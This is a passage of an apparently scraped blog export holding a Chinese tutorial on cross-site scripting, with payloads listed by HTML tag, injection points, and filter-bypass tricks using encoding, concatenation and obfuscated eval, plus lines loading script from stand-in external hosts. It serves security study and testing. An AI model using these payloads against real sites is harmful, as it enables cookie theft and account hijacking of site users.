标签\n\n- script 标签是最直接的XSS有效载荷，脚本标记可以引用外部的 JavaScript 代码，也可以将代码插入脚本标记中\n\n```html\n<script>alert(\"hack\")</script>  \n<script>alert(/hack/)</script>  \n<script>alert(1)</script> ＃ 弹出1，对于数字可以不用引号 \n<script>alert(document.cookie)</script> ＃ 弹出cookie \n<script src＝http://xxx.com/xss.js > </script> ＃ 引用外部的js \n```\n\n### 2.1.2 svg 标签\n\n```html\n<svg onload=\"alert(1)\">\n<svg onload=\"alert(1)\"//\n```\n\n### 2.1.3 img 标签\n\n```html\n<img src=1 onerror=alert(\"hack\")>\n<img src=1 onerror=alert(document.cookie)>\n```\n### 2.1.4 body 标签\n\n```html\n<body onload=alert(1)>\n<body onpageshow=alert(1)>\n```\n\n### 2.1.5 video 标签\n\n```html\n<video onloadstart=alert(1) src=\"/media/aaa.mp4\" />\n```\n\n### 2.1.6 style 标签\n\n```html\n<style onload=alert(1)></style>\n```\n\n### 2.1.7 details\n\n```html\n<details open ontoggle=\"alert('xss');\">\n```\n\n### 2.1.8 select\n\n```html\n<select onfocus=alert(1) autofocus>\n```\n\n### 2.1.9 iframe\n\n```html\n<iframe onload=alert(\"xss\");></iframe>\n<iframe src=javascript:alert('xss')></iframe>\n```\n\n### 2.1.10 form\n\n```html\n<form action=javascript:alert('xss') method=\"get\">\n```\n\n### 2.1.11 自定义标签\n\n```html\n<a href='javascript:alert(666)'>click</a>\n<a href='javascript:alert(document.domain)'>click</a>\n```\n\n## 2.2 XSS 可以插入的位置\n\n- 用户输入作为script的标签内容\n- 用户输入作为html注释内容\n- 用户输入作为html标签的属性名\n- 用户输入作为html标签属性值\n- 用户输入作为html标签的名字直接插入到CSS里\n\n### 2.2.1 测试位置\n\n- 常见业务场景  \n重灾区：评论区、留言区、个人信息、订单信息、站内信、网页及时通讯、私信、意见反馈  \n存在风险：搜索框、当前目录、图片属性、URL本身、URL所有参数、表单\n\n```html\nuername=<script>alert(1)<script>&</script>&password=******\n```\n\n# 3 XSS 编码与绕过\n\n## 3.1 网页的解码过程\n\n编码就是将字符变为二进制数，而解码就是还原二进制数为字符。从浏览器请求url到在页面上显示出来也经历了一些编码和解码过程。\n\n- URL编码\n\nURL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。\n\n- HTML编码/解码\n\n当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是看到的源代码。具体的解码方式依具体情况而定，所以需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码，所以很多网页就指定了解码方式为UTF-8。\n\n但是在HTML中有些字符是和关键词冲突的，比如<、>、&，解码之后，浏览器会误认为它们是标签，为了正确地显示预留字符，需要在HTML源代码中使用字符实体，比如常见的空格&nbsp;，字符实体以&开头+预先定义的实体名称表示，但不是所有的字符都有实体名称，但是它们都有实体编号，也可以用&#开头+实体编号+分号表示。比如：\n\n显示结果 | 描述 | 实体名称 | 实体编号\n| - | - | - | - |\n< | 小于号 | &lt; | &#60;\n| > | 大于号 | &gt; | &#62;\n\n浏览器对HTML解码之后就开始解析HTML，将标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。\n\n> tip:所以在PHP中，使用htmlspecialchars()函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。\n\n- JS解码（只支持UNICODE）\n\n当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如`<script> <style>`这样的标签，解析器会自动切换到JS解析模式，而src、 href 后边加入的javascript 伪URL，也会进入JS 的解析模式。\n\n比如`<a href=\"javascript:alert('<\\u4e00>')\">test</a>`，javascript 出发了JS 解释器，JS会先对内容进行解析，里边有一个转义字符\\u4e00，前导的 \\u 表示他是一个unicode 字符，根据后边的数字，解析为一，于是在完成JS的解析之后变成了：href=\"javascript:alert('<一>')\">test\n\n## 3.2 绕过\n\n### 3.2.1 关键字被过滤\n\n#### 3.2.1.1 双写绕过\n\n```html\n<scrscriptipt>alert('xss')</scrscriptipt>\n```\n\n#### 3.2.1.2 字符拼接\n\n```html\n<img src=\"x\" onerror=\"a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)\">\n<script>top[\"al\"+\"ert\"](`xss`);</script>\n```\n\n#### 3.2.1.3 编码绕过\n\n```html\n# Unicode 编码\n<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;\">\n<img src=\"x\" onerror=\"eval('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0022\\u0078\\u0073\\u0073\\u0022\\u0029\\u003b')\">\n\n# url 编码\n<img src=\"x\" onerror=\"eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))\">\n<iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>\n\n# ascii 码\n<img src=\"x\" onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))\">\n\n# hex 码\n<img src=x onerror=eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29')>\n\n# 八进制\n<img src=x onerror=alert('\\170\\163\\163')>\n\n# base64\n<img src=\"x\" onerror=\"eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))\">\n<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=\">\n```\n\n#### 3.2.1.4 内嵌编码后TAB\n\n```html\n<img src=\"jav&#x09;ascript:alert('XSS');\">\n```\n\n#### 3.2.1.5 多重尖括号\n\n```html\n<<script>alert(\"XSS\");//<</script>\n```\n\n#### 3.2.1.6 将JS文件重命名为图像\n\n```html\n<script src=\"http://xss.rooks/xss.jpg\"><script>\n```\n\n### 3.2.2 过滤空格/引号\n\n#### 3.2.2.1 使用/代替\n\n```html\n<img/src=\"x\"/onerror=alert(\"xss\");>\n<img src=\"x\" onerror=alert(/xss/);>\n```\n\n### 3.2.3 过滤单/双引号\n\n```html\n# 使用反引号代替\n<img src=x onerror=alert(`xss`);>\n# 编码绕过\n<img src=x onerror=alert(&#x27;xss&#x27;);>\n```\n\n### 3.2.4 过滤括号\n\n```html\n# 使用 throw 绕过\n<script>onerror=alert;throw 1337</script>\n> onerror在每次javascript执行异常时都会被激活，调用指定的处理程序，并且throw语句可创建一个发送到onerror处的包含表达式的自定义异常。因为throw是一个语句，在和onerror配合使用时需要用分号隔离，避免被包含。\n\n# 使用``代替\n<script>alert`1`</script>\n\n# HTML编码绕过\n<script>alert&#x28;1&#x29;</script>\n```\n\n### 3.2.5 过滤URL地址\n\n```html\n# 使用URL编码\n<img src=\"x\" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>\n\n# 使用IP\n# 使用进制转换\n<img src=\"x\" onerror=document.location=`http://2130706433/`>\n<img src=\"x\" onerror=document.location=`http://0177.0.0.01/`>\n<img src=\"x\" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>\n\n# html标签中用//可以代替http://\n<img src=\"x\" onerror=document.location=`//www.baidu.com`>\n\n# 使用\\\\\n但是要注意在windows下\\本身就有特殊用途，是一个 path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议\n<img src=\"x\" onerror=document.location=`\\\\www.baidu.com`>\n\n# 使用中文句号代替英文点号\n<img src=\"x\" onerror=\"document.location=`http://www。baidu。com`\">\n\n# 利用data类型的url代替http://\ndata:text,alert()\n```\n\n# 4 利用 \n\n[XSS plamform](https://xss.pt/xss.php?do=login)\n\n\n\n## 参考文章\n\n[xss总结](https://johnfrod.top/%e5%ae%89%e5%85%a8/xss%e6%80%bb%e7%bb%93/)\n[xss编码剖析](https://johnfrod.top/%e5%ae%89%e5%85%a8/xss%e7%bc%96%e7%a0%81%e5%89%96%e6%9e%90/)\n[探索XSS利用编码绕过的原理](https://saucer-man.com/information_security/103.html)\n\n\n","source":"_posts/2022-07-21.经典漏洞-XSS.md","raw":"---\ntitle: 经典漏洞-XSS\nexcerpt: XSS原理、XSS编码……\nindex_img: /img/article-head/XSS.png\ndate: \"2022/7/21 16:46:25\"\nupdated: \"2022/8/4 12:30:25\"\nhide: false\ntags:\n- Security\n- PenTest\n- 经典漏洞\ncategories:\n- Security\n- PenTest\n- 经典漏洞\n---\n\n- [1 XSS 概述和原理](#1-xss-概述和原理)\n- [1.1 XSS 类型](#11-xss-类型)\n- [2 XSS 载荷与插入位置](#2-xss-载荷与插入位置)\n  - [2.1 载荷](#21-载荷)\n    - [2.1.1 script 标签](#211-script-标签)\n    - [2.1.2 svg 标签](#212-svg-标签)\n    - [2.1.3 img 标签](#213-img-标签)\n    - [2.1.4 body 标签](#214-body-标签)\n    - [2.1.5 video 标签](#215-video-标签)\n    - [2.1.6 style 标签](#216-style-标签)\n    - [2.1.7 details](#217-details)\n    - [2.1.8 select](#218-select)\n    - [2.1.9 iframe](#219-iframe)\n    - [2.1.10 form](#2110-form)\n    - [2.1.11 自定义标签](#2111-自定义标签)\n  - [2.2 XSS 可以插入的位置](#22-xss-可以插入的位置)\n    - [2.2.1 测试位置](#221-测试位置)\n- [3 XSS 编码与绕过](#3-xss-编码与绕过)\n  - [3.1 网页的解码过程](#31-网页的解码过程)\n  - [3.2 绕过](#32-绕过)\n    - [3.2.1 关键字被过滤](#321-关键字被过滤)\n      - [3.2.1.1 双写绕过](#3211-双写绕过)\n      - [3.2.1.2 字符拼接](#3212-字符拼接)\n      - [3.2.1.3 编码绕过](#3213-编码绕过)\n      - [3.2.1.4 内嵌编码后TAB](#3214-内嵌编码后tab)\n      - [3.2.1.5 多重尖括号](#3215-多重尖括号)\n      - [3.2.1.6 将JS文件重命名为图像](#3216-将js文件重命名为图像)\n    - [3.2.2 过滤空格/引号](#322-过滤空格引号)\n      - [3.2.2.1 使用/代替](#3221-使用代替)\n    - [3.2.3 过滤单/双引号](#323-过滤单双引号)\n    - [3.2.4 过滤括号](#324-过滤括号)\n    - [3.2.5 过滤URL地址](#325-过滤url地址)\n- [4 利用](#4-利用)\n  - [参考文章](#参考文章)\n\n# 1 XSS 概述和原理\n\n跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。  \n\nHTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号 < 被看作是HTML标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如<）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。\n\n# 1.1 XSS 类型\n\n- 存储型XSS\n \n存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃 cookie\n\n![存储型xss](/img/article/XSS/存储型xss.png)\n\n- 反射型XSS\n\n非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。\n\n![反射型xss](/img/article/XSS/反射型xss.png)\n\n- DOM型XSS\n\n不经过后端，DOM-XSS漏洞是基于文档对象模型（Document Objeet Model，DOM）的一种漏洞，DOM—XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。DOM的详解：DOM文档对象模型  \n> 可能触发DOM型XSS的属性：document.referer window.name location innerHTML documen.write \n\n# 2 XSS 载荷与插入位置\n\n## 2.1 载荷\n\n> tip: 所有的闭合标签的 `>` 都可以用 `//` 代替 \n\n### 2.1.1 script 标签\n\n- script 标签是最直接的XSS有效载荷，脚本标记可以引用外部的 JavaScript 代码，也可以将代码插入脚本标记中\n\n```html\n<script>alert(\"hack\")</script>  \n<script>alert(/hack/)</script>  \n<script>alert(1)</script> ＃ 弹出1，对于数字可以不用引号 \n<script>alert(document.cookie)</script> ＃ 弹出cookie \n<script src＝http://xxx.com/xss.js > </script> ＃ 引用外部的js \n```\n\n### 2.1.2 svg 标签\n\n```html\n<svg onload=\"alert(1)\">\n<svg onload=\"alert(1)\"//\n```\n\n### 2.1.3 img 标签\n\n```html\n<img src=1 onerror=alert(\"hack\")>\n<img src=1 onerror=alert(document.cookie)>\n```\n### 2.1.4 body 标签\n\n```html\n<body onload=alert(1)>\n<body onpageshow=alert(1)>\n```\n\n### 2.1.5 video 标签\n\n```html\n<video onloadstart=alert(1) src=\"/media/aaa.mp4\" />\n```\n\n### 2.1.6 style 标签\n\n```html\n<style onload=alert(1)></style>\n```\n\n### 2.1.7 details\n\n```html\n<details open ontoggle=\"alert('xss');\">\n```\n\n### 2.1.8 select\n\n```html\n<select onfocus=alert(1) autofocus>\n```\n\n### 2.1.9 iframe\n\n```html\n<iframe onload=alert(\"xss\");></iframe>\n<iframe src=javascript:alert('xss')></iframe>\n```\n\n### 2.1.10 form\n\n```html\n<form action=javascript:alert('xss') method=\"get\">\n```\n\n### 2.1.11 自定义标签\n\n```html\n<a href='javascript:alert(666)'>click</a>\n<a href='javascript:alert(document.domain)'>click</a>\n```\n\n## 2.2 XSS 可以插入的位置\n\n- 用户输入作为script的标签内容\n- 用户输入作为html注释内容\n- 用户输入作为html标签的属性名\n- 用户输入作为html标签属性值\n- 用户输入作为html标签的名字直接插入到CSS里\n\n### 2.2.1 测试位置\n\n- 常见业务场景  \n重灾区：评论区、留言区、个人信息、订单信息、站内信、网页及时通讯、私信、意见反馈  \n存在风险：搜索框、当前目录、图片属性、URL本身、URL所有参数、表单\n\n```html\nuername=<script>alert(1)<script>&</script>&password=******\n```\n\n# 3 XSS 编码与绕过\n\n## 3.1 网页的解码过程\n\n编码就是将字符变为二进制数，而解码就是还原二进制数为字符。从浏览器请求url到在页面上显示出来也经历了一些编码和解码过程。\n\n- URL编码\n\nURL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。\n\n- HTML编码/解码\n\n当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是看到的源代码。具体的解码方式依具体情况而定，所以需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码，所以很多网页就指定了解码方式为UTF-8。\n\n但是在HTML中有些字符是和关键词冲突的，比如<、>、&，解码之后，浏览器会误认为它们是标签，为了正确地显示预留字符，需要在HTML源代码中使用字符实体，比如常见的空格&nbsp;，字符实体以&开头+预先定义的实体名称表示，但不是所有的字符都有实体名称，但是它们都有实体编号，也可以用&#开头+实体编号+分号表示。比如：\n\n显示结果 | 描述 | 实体名称 | 实体编号\n| - | - | - | - |\n< | 小于号 | &lt; | &#60;\n| > | 大于号 | &gt; | &#62;\n\n浏览器对HTML解码之后就开始解析HTML，将标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。\n\n> tip:所以在PHP中，使用htmlspecialchars()函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。\n\n- JS解码（只支持UNICODE）\n\n当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如`<script> <style>`这样的标签，解析器会自动切换到JS解析模式，而src、 href 后边加入的javascript 伪URL，也会进入JS 的解析模式。\n\n比如`<a href=\"javascript:alert('<\\u4e00>')\">test</a>`，javascript 出发了JS 解释器，JS会先对内容进行解析，里边有一个转义字符\\u4e00，前导的 \\u 表示他是一个unicode 字符，根据后边的数字，解析为一，于是在完成JS的解析之后变成了：href=\"javascript:alert('<一>')\">test\n\n## 3.2 绕过\n\n### 3.2.1 关键字被过滤\n\n#### 3.2.1.1 双写绕过\n\n```html\n<scrscriptipt>alert('xss')</scrscriptipt>\n```\n\n#### 3.2.1.2 字符拼接\n\n```html\n<img src=\"x\" onerror=\"a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)\">\n<script>top[\"al\"+\"ert\"](`xss`);</script>\n```\n\n#### 3.2.1.3 编码绕过\n\n```html\n# Unicode 编码\n<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;\">\n<img src=\"x\" onerror=\"eval('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0022\\u0078\\u0073\\u0073\\u0022\\u0029\\u003b')\">\n\n# url 编码\n<img src=\"x\" onerror=\"eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))\">\n<iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>\n\n# ascii 码\n<img src=\"x\" onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))\">\n\n# hex 码\n<img src=x onerror=eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29')>\n\n# 八进制\n<img src=x onerror=alert('\\170\\163\\163')>\n\n# base64\n<img src=\"x\" onerror=\"eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))\">\n<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=\">\n```\n\n#### 3.2.1.4 内嵌编码后TAB\n\n```html\n<img src=\"jav&#x09;ascript:alert('XSS');\">\n```\n\n#### 3.2.1.5 多重尖括号\n\n```html\n<<script>alert(\"XSS\");//<</script>\n```\n\n#### 3.2.1.6 将JS文件重命名为图像\n\n```html\n<script src=\"http://xss.rooks/xss.jpg\"><script>\n```\n\n### 3.2.2 过滤空格/引号\n\n#### 3.2.2.1 使用/代替\n\n```html\n<img/src=\"x\"/onerror=alert(\"xss\");>\n<img src=\"x\" onerror=alert(/xss/);>\n```\n\n### 3.2.3 过滤单/双引号\n\n```html\n# 使用反引号代替\n<img src=x onerror=alert(`xss`);>\n# 编码绕过\n<img src=x onerror=alert(&#x27;xss&#x27;);>\n```\n\n### 3.2.4 过滤括号\n\n```html\n# 使用 throw 绕过\n<script>onerror=alert;throw 1337</script>\n> onerror在每次javascript执行异常时都会被激活，调用指定的处理程序，并且throw语句可创建一个发送到onerror处的包含表达式的自定义异常。因为throw是一个语句，在和onerror配合使用时需要用分号隔离，避免被包含。\n\n# 使用``代替\n<script>alert`1`</script>\n\n# HTML编码绕过\n<script>alert&#x28;1&#x29;</script>\n```\n\n### 3.2.5 过滤URL地址\n\n```html\n# 使用URL编码\n<img src=\"x\" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>\n\n# 使用IP\n# 使用进制转换\n<img src=\"x\" onerror=document.location=`http://2130706433/`>\n<img src=\"x\" onerror=document.location=`http://0177.0.0.01/`>\n<img src=\"x\" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>\n\n# html标签中用//可以代替http://\n<img src=\"x\" onerror=document.location=`//www.baidu.com`>\n\n# 使用\\\\\n但是要注意在windows下\\本身就有特殊用途，是一个 path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议\n<img src=\"x\" onerror=document.location=`\\\\www.baidu.com`>\n\n# 使用中文句号代替英文点号\n<img src=\"x\" onerror=\"document.location=`http://www。baidu。com`\">\n\n# 利用data类型的url代替http://\ndata:text,alert()\n```\n\n# 4 利用 \n\n[XSS plamform](https://xss.pt/xss.php?do=login)\n\n\n\n## 参考文章\n\n[xss总结](https://johnfrod.top/%e5%ae%89%e5%85%a8/xss%e6%80%bb%e7%bb%93/)\n[xss编码剖析](https://johnfrod.top/%e5%ae%89%e5%85%a8/xss%e7%bc%96%e7%a0%81%e5%89%96%e6%9e%90/)\n[探索XSS利用编码绕过的原理](https://saucer-man.com/information_security/103.html)\n\n\n","slug":"2022-07-21.经典漏洞-XSS","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cl6nug9b3000goqnacc4g0o6o","content":"<ul>\n<li><a href=\"#1-xss-%E6%A6%82%E8%BF%B0%E5%92%8C%E5%8E%9F%E7%90%86\">1 XSS 概述和原理</a></li>\n<li><a href=\"#11-xss-%E7%B1%BB%E5%9E%8B\">1.1 XSS 类型</a></li>\n<li><a href=\"#2-xss-%E8%BD%BD%E8%8D%B7%E4%B8%8E%E6%8F%92%E5%85%A5%E4%BD%8D%E7%BD%AE\">2 XSS 载荷与插入位置</a><ul>\n<li><a href=\"#21-%E8%BD%BD%E8%8D%B7\">2.1 载荷</a><ul>\n<li><a href=\"#211-script-%E6%A0%87%E7%AD%BE\">2.1.1 script 标签</a></li>\n<li><a href=\"#212-svg-%E6%A0%87%E7%AD%BE\">2.1.2 svg 标签</a></li>\n<li><a href=\"#213-img-%E6%A0%87%E7%AD%BE\">2.1.3 img 标签</a></li>\n<li><a href=\"#214-body-%E6%A0%87%E7%AD%BE\">2.1.4 body 标签</a></li>\n<li><a href=\"#215-video-%E6%A0%87%E7%AD%BE\">2.1.5 video 标签</a></li>\n<li><a href=\"#216-style-%E6%A0%87%E7%AD%BE\">2.1.6 style 标签</a></li>\n<li><a href=\"#217-details\">2.1.7 details</a></li>\n<li><a href=\"#218-select\">2.1.8 select</a></li>\n<li><a href=\"#219-iframe\">2.1.9 iframe</a></li>\n<li><a href=\"#2110-form\">2.1.10 form</a></li>\n<li><a href=\"#2111-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%87%E7%AD%BE\">2.1.11 自定义标签</a></li>\n</ul>\n</li>\n<li><a href=\"#22-xss-%E5%8F%AF%E4%BB%A5%E6%8F%92%E5%85%A5%E7%9A%84%E4%BD%8D%E7%BD%AE\">2.2 XSS 可以插入的位置</a><ul>\n<li><a href=\"#221-%E6%B5%8B%E8%AF%95%E4%BD%8D%E7%BD%AE\">2.2.1 测试位置</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#3-xss-%E7%BC%96%E7%A0%81%E4%B8%8E%E7%BB%95%E8%BF%87\">3 XSS 编码与绕过</a><ul>\n<li><a href=\"#31-%E7%BD%91%E9%A1%B5%E7%9A%84%E8%A7%A3%E7%A0%81%E8%BF%87%E7%A8%8B\">3.1 网页的解码过程</a></li>\n<li><a href=\"#32-%E7%BB%95%E8%BF%87\">3.2 绕过</a><ul>\n<li><a href=\"#321-%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4\">3.2.1 关键字被过滤</a><ul>\n<li><a href=\"#3211-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87\">3.2.1.1 双写绕过</a></li>\n<li><a href=\"#3212-%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5\">3.2.1.2 字符拼接</a></li>\n<li><a href=\"#3213-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87\">3.2.1.3 编码绕过</a></li>\n<li><a href=\"#3214-%E5%86%85%E5%B5%8C%E7%BC%96%E7%A0%81%E5%90%8Etab\">3.2.1.4 内嵌编码后TAB</a></li>\n<li><a href=\"#3215-%E5%A4%9A%E9%87%8D%E5%B0%96%E6%8B%AC%E5%8F%B7\">3.2.1.5 多重尖括号</a></li>\n<li><a href=\"#3216-%E5%B0%86js%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8D%E4%B8%BA%E5%9B%BE%E5%83%8F\">3.2.1.6 将JS文件重命名为图像</a></li>\n</ul>\n</li>\n<li><a href=\"#322-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E5%BC%95%E5%8F%B7\">3.2.2 过滤空格&#x2F;引号</a><ul>\n<li><a href=\"#3221-%E4%BD%BF%E7%94%A8%E4%BB%A3%E6%9B%BF\">3.2.2.1 使用&#x2F;代替</a></li>\n</ul>\n</li>\n<li><a href=\"#323-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7\">3.2.3 过滤单&#x2F;双引号</a></li>\n<li><a href=\"#324-%E8%BF%87%E6%BB%A4%E6%8B%AC%E5%8F%B7\">3.2.4 过滤括号</a></li>\n<li><a href=\"#325-%E8%BF%87%E6%BB%A4url%E5%9C%B0%E5%9D%80\">3.2.5 过滤URL地址</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#4-%E5%88%A9%E7%94%A8\">4 利用</a><ul>\n<li><a href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0\">参考文章</a></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"1-XSS-概述和原理\"><a href=\"#1-XSS-概述和原理\" class=\"headerlink\" title=\"1 XSS 概述和原理\"></a>1 XSS 概述和原理</h1><p>跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份&#x2F;钓鱼&#x2F;传播恶意代码等行为。  </p>\n<p>HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号 &lt; 被看作是HTML标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。</p>\n<h1 id=\"1-1-XSS-类型\"><a href=\"#1-1-XSS-类型\" class=\"headerlink\" title=\"1.1 XSS 类型\"></a>1.1 XSS 类型</h1><ul>\n<li>存储型XSS</li>\n</ul>\n<p>存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃 cookie</p>\n<p><img src=\"/img/article/XSS/%E5%AD%98%E5%82%A8%E5%9E%8Bxss.png\" alt=\"存储型xss\"></p>\n<ul>\n<li>反射型XSS</li>\n</ul>\n<p>非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p>\n<p><img src=\"/img/article/XSS/%E5%8F%8D%E5%B0%84%E5%9E%8Bxss.png\" alt=\"反射型xss\"></p>\n<ul>\n<li>DOM型XSS</li>\n</ul>\n<p>不经过后端，DOM-XSS漏洞是基于文档对象模型（Document Objeet Model，DOM）的一种漏洞，DOM—XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。DOM的详解：DOM文档对象模型  </p>\n<blockquote>\n<p>可能触发DOM型XSS的属性：document.referer window.name location innerHTML documen.write </p>\n</blockquote>\n<h1 id=\"2-XSS-载荷与插入位置\"><a href=\"#2-XSS-载荷与插入位置\" class=\"headerlink\" title=\"2 XSS 载荷与插入位置\"></a>2 XSS 载荷与插入位置</h1><h2 id=\"2-1-载荷\"><a href=\"#2-1-载荷\" class=\"headerlink\" title=\"2.1 载荷\"></a>2.1 载荷</h2><blockquote>\n<p>tip: 所有的闭合标签的 <code>&gt;</code> 都可以用 <code>//</code> 代替 </p>\n</blockquote>\n<h3 id=\"2-1-1-script-标签\"><a href=\"#2-1-1-script-标签\" class=\"headerlink\" title=\"2.1.1 script 标签\"></a>2.1.1 script 标签</h3><ul>\n<li>script 标签是最直接的XSS有效载荷，脚本标记可以引用外部的 JavaScript 代码，也可以将代码插入脚本标记中</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-string\">&quot;hack&quot;</span>)</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>  <br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-regexp\">/hack/</span>)</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>  <br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span>alert(1)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span> ＃ 弹出1，对于数字可以不用引号 <br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-property\">cookie</span>)</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span> ＃ 弹出cookie <br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>＝<span class=\"hljs-attr\">http:</span>//<span 